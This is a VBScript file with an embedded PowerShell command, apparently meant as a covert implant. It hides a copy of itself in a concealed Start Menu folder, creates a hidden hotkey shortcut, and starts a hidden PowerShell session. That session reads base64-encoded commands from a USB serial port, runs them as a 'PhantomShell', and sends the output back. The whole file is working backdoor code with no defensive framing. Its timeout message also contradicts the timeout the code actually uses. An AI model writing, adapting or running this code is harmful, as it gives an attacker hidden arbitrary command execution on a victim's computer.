Option Explicit

Dim hotkey
hotkey = "CTRL+ALT+SHIFT+H"

Const HIDDEN = 2
Const SYSTEM = 4

Dim fso, wsh
Set fso = CreateObject("Scripting.FileSystemObject")
Set wsh = CreateObject("WScript.Shell")

Dim sourceVBScript, fileName, hiddenFolder, targetVBScript, shortcutName, shortcutPath
sourceVBScript = WScript.ScriptFullName
fileName = fso.GetFileName(sourceVBScript)
hiddenFolder = wsh.ExpandEnvironmentStrings("%AppData%") & "\Microsoft\Windows\Start Menu\Programs\SystemTasks"
targetVBScript = hiddenFolder & "\" & fileName
shortcutName = fso.GetBaseName(fileName) & ".lnk"
shortcutPath = hiddenFolder & "\" & shortcutName

If Not fso.FolderExists(hiddenFolder) Then
    fso.CreateFolder hiddenFolder
    On Error Resume Next
    SetAttr hiddenFolder, HIDDEN Or SYSTEM
    On Error GoTo 0
End If

Dim copyNeeded
copyNeeded = False

If Not fso.FileExists(targetVBScript) Then
    copyNeeded = True
Else
    Dim srcFile, dstFile
    Set srcFile = fso.GetFile(sourceVBScript)
    Set dstFile = fso.GetFile(targetVBScript)
    If srcFile.DateLastModified > dstFile.DateLastModified Then
        copyNeeded = True
    End If
End If

If copyNeeded Then
    fso.CopyFile sourceVBScript, targetVBScript, True
    On Error Resume Next
    SetAttr targetVBScript, HIDDEN Or SYSTEM
    On Error GoTo 0
End If

Dim shortcut, updateNeeded
updateNeeded = False

If fso.FileExists(shortcutPath) Then
    Set shortcut = wsh.CreateShortcut(shortcutPath)
    If shortcut.TargetPath <> "wscript.exe" _
       Or shortcut.Arguments <> Chr(34) & targetVBScript & Chr(34) _
       Or shortcut.Hotkey <> hotkey Then
        updateNeeded = True
    End If
Else
    updateNeeded = True
    Set shortcut = wsh.CreateShortcut(shortcutPath)
End If

If updateNeeded Then
    shortcut.TargetPath = "wscript.exe"
    shortcut.Arguments = Chr(34) & targetVBScript & Chr(34)
    shortcut.WorkingDirectory = hiddenFolder
    shortcut.IconLocation = "wscript.exe, 0"
    shortcut.WindowStyle = 7
    shortcut.Hotkey = hotkey
    shortcut.Save
    On Error Resume Next
    SetAttr shortcutPath, HIDDEN Or SYSTEM
    On Error GoTo 0
End If

Dim psCmd
psCmd = "$p=Get-PnpDevice -Class Ports|?{$_.Status -eq 'OK'-and $_.FriendlyName -like '*USB*'}|%{if($_.FriendlyName -match '(COM\d+)'){$matches[1]}}|select -First 1;if(!$p){exit};$s='CMD_START:';$e=':CMD_END';$rs='RESP_START:';$re=':RESP_END';$pt=New-Object System.IO.Ports.SerialPort;$pt.PortName=$p;$pt.BaudRate=921600;$pt.DataBits=8;$pt.Parity=0;$pt.StopBits=1;$pt.ReadTimeout=100;$pt.WriteTimeout=1000;try{$pt.Open()}catch{exit};$sb='';$ic=$false;$sr=$null;$se=$false;function SD{param([string]$d);if([string]::IsNullOrEmpty($d)){return};try{$b=[System.Text.Encoding]::UTF8.GetBytes($d);$b64=[Convert]::ToBase64String($b);$cs=512;for($i=0;$i -lt $b64.Length;$i+=$cs){$l=[Math]::Min($cs,$b64.Length-$i);$c=$b64.Substring($i,$l);$il=($i+$l)-ge $b64.Length;if(!$il){$c=$c.TrimEnd('=')};$pt.Write($c);Start-Sleep -Milliseconds 50}}catch{exit}};function SSM{try{$pt.Write($rs);Start-Sleep -Milliseconds 10}catch{exit}};function SEM{try{Start-Sleep -Milliseconds 20;$pt.Write($re)}catch{exit}};function SIS{$iss=[System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault();$r=[runspacefactory]::CreateRunspace($iss);$r.Open();return $r};function StIS{if($script:sr){try{$script:sr.Close();$script:sr.Dispose()}catch{};$script:sr=$null}};function EE{param([string]$c);[System.Text.RegularExpressions.Regex]::Replace($c,'%([^%]+)%',{param($m);$v=[Environment]::GetEnvironmentVariable($m.Groups[1].Value);if($v){$v}else{$m.Value}})};function EC{param([string]$c);$c=EE $c;if($c -eq 'exit'){$script:se=$true;return};if($c -eq 'restart_shell'){SSM;SD 'Restarting PhantomShell...';StIS;$script:sr=SIS;SD 'New PhantomShell started.';SEM;return};if(!$script:sr){$script:sr=SIS};SSM;try{$ps=[powershell]::Create();$ps.Runspace=$script:sr;$ps.AddScript($c)|Out-Null;$oc=New-Object 'System.Management.Automation.PSDataCollection[PSObject]';$ar=$ps.BeginInvoke([System.Management.Automation.PSDataCollection[PSObject]]::new(),$oc);$to=[DateTime]::Now.AddSeconds(21600);$ls=0;$cp=$false;while(!$cp -and [DateTime]::Now -lt $to){if($ar.IsCompleted){$cp=$true};if($oc.Count -gt $ls){$ni=@();for($i=$ls;$i -lt $oc.Count;$i++){$ni+=$oc[$i]};if($ni.Count -gt 0){$t=$ni|Out-String;if(![string]::IsNullOrWhiteSpace($t)){SD $t}};$ls=$oc.Count};if($ps.Streams.Error.Count -gt 0){foreach($er in $ps.Streams.Error){$m='ERROR: '+$er.ToString();SD $m};$ps.Streams.Error.Clear()};if($ps.Streams.Warning.Count -gt 0){foreach($w in $ps.Streams.Warning){$m='WARNING: '+$w.ToString();SD $m};$ps.Streams.Warning.Clear()};if(!$cp){Start-Sleep -Milliseconds 50}};if($cp){$ps.EndInvoke($ar)}else{$ps.Stop();SD '[Command timed out after 30 seconds]'};$ps.Dispose()}catch{$m='ERROR executing command: '+$_.Exception.Message;SD $m;StIS;$script:sr=SIS}finally{SEM}};$sr=SIS;try{Set-Location $env:USERPROFILE}catch{};SSM;SD 'Im Alive !';SEM;try{while(!$se){try{if(!$pt.IsOpen){exit};if($pt.BytesToRead -gt 0){$d=$pt.ReadExisting();$sb+=$d;$si=$sb.IndexOf($s);if($si -ge 0 -and !$ic){$ic=$true;$sb=$sb.Substring($si+$s.Length)};$ei=$sb.IndexOf($e);if($ei -ge 0 -and $ic){$b64c=$sb.Substring(0,$ei);try{$cb=[Convert]::FromBase64String($b64c);$cm=[System.Text.Encoding]::UTF8.GetString($cb);EC $cm}catch{};$ic=$false;$sb=$sb.Substring($ei+$e.Length)};if($sb.Length -gt 4096 -and !$ic){$sb=$sb.Substring($sb.Length-1024)}}}catch [System.TimeoutException]{}catch{exit};Start-Sleep -Milliseconds 1}}finally{StIS;if($pt.IsOpen){$pt.Close()};$pt.Dispose()}"

wsh.Run "powershell.exe -WindowStyle Hidden -Command """ & psCmd & """", 0, False

Set shortcut = Nothing
Set fso = Nothing
Set wsh = Nothing